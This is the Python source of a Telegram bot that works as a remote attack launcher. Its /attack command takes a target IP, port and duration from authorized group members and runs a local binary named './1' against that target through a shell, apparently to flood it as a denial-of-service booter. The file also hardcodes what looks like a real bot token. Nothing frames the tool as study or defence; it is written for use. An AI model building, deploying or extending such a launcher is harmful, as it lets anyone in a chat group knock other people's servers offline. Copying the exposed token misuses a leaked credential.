import telebot
import os
import subprocess
import json
import threading
from loguru import logger

# === Configuration ===
OWNER_IDS = [7353797869]  
BOT_TOKEN = '7616579954:AAExST5w1CSTAppPA0c0FjJyqV7SE6xXDWI'  # Your bot token
CONFIG_FILE = 'config.json'
MAX_DURATION = 240  # Max attack duration in seconds

# === Bot Initialization ===
bot = telebot.TeleBot(BOT_TOKEN)

# === Load / Save Config ===
def load_config():
    try:
        if not os.path.exists(CONFIG_FILE):
            return {}
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    except Exception as e:
        logger.error(f"Error loading config: {e}")
        return {}

def save_config(cfg):
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(cfg, f, indent=4)
    except Exception as e:
        logger.error(f"Error saving config: {e}")

config = load_config()
allowed_group_ids = config.get("allowed_group_ids", [])

# === Attack State ===
attack_in_progress = False
current_target_ip = None

# === Utility ===
def validate_ip(ip):
    try:
        parts = ip.split(".")
        return len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts)
    except:
        return False

def is_owner(user_id):
    return user_id in OWNER_IDS

# === Attack Routines ===
def run_attack(chat_id, ip, port, duration):
    """Executes the attack command and notifies when done."""
    global attack_in_progress, current_target_ip
    try:
        cmd = f"./1 {ip} {port} {duration} 9 900"
        logger.info(f"Starting attack: {cmd}")
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = proc.communicate()
        bot.send_message(chat_id, f"✅ Attack finished on {ip}:{port}")
        if err:
            logger.error(f"Attack stderr: {err.decode().strip()}")
    except Exception as e:
        logger.error(f"Attack error: {e}")
        bot.send_message(chat_id, f"❌ Error during attack: {e}")
    finally:
        attack_in_progress = False
        current_target_ip = None

def start_attack(chat_id, ip, port, duration):
    thread = threading.Thread(target=run_attack, args=(chat_id, ip, port, duration), daemon=True)
    thread.start()

# === Command Handlers ===
@bot.message_handler(commands=['start'])
def cmd_start(msg):
    bot.reply_to(msg,
        "Welcome!\n"
        "• OWNER: use /setgroup inside a group to authorize it.\n"
        "• In authorized groups, use /attack <ip> <port> <seconds>."
    )

@bot.message_handler(commands=['setgroup'])
def cmd_setgroup(msg):
    global allowed_group_ids, config

    if not is_owner(msg.from_user.id):
        return bot.reply_to(msg, "🚫 You are not an owner.")
    if msg.chat.type not in ("group", "supergroup"):
        return bot.reply_to(msg, "❗️ Use /setgroup inside a group.")
    
    gid = msg.chat.id
    if gid in allowed_group_ids:
        bot.reply_to(msg, "ℹ️ This group is already authorized.")
    else:
        allowed_group_ids.append(gid)
        config["allowed_group_ids"] = allowed_group_ids
        save_config(config)
        bot.reply_to(msg, f"✅ Group `{gid}` added to allowed list.")

@bot.message_handler(commands=['attack'])
def cmd_attack(msg):
    global attack_in_progress, current_target_ip

    if msg.chat.id not in allowed_group_ids:
        return bot.reply_to(msg, "🚫 This group is not authorized to use /attack.")

    parts = msg.text.split()
    if len(parts) != 4:
        return bot.reply_to(msg, "Usage: /attack <ip> <port> <seconds>")
    
    ip, port_str, dur_str = parts[1], parts[2], parts[3]
    try:
        port = int(port_str)
        duration = int(dur_str)
    except ValueError:
        return bot.reply_to(msg, "❗️ Port and time must be integers.")

    if not validate_ip(ip):
        return bot.reply_to(msg, "❗️ Invalid IP address.")
    if not (1 <= port <= 65535):
        return bot.reply_to(msg, "❗️ Port must be 1–65535.")
    if not (1 <= duration <= MAX_DURATION):
        return bot.reply_to(msg, f"❗️ Duration must be 1–{MAX_DURATION} seconds.")

    if attack_in_progress:
        return bot.reply_to(msg, f"⚠️ An attack is already in progress . Please wait until it finishes.")

    # Start attack
    attack_in_progress = True
    current_target_ip = ip
    bot.send_message(msg.chat.id,
                     f"🚀 Attack started on `{ip}:{port}` for {duration}s.",
                     parse_mode='Markdown')
    start_attack(msg.chat.id, ip, port, duration)

# === Bot Launcher ===
if __name__ == "__main__":
    logger.info("Bot is starting...")
    bot.infinity_polling()
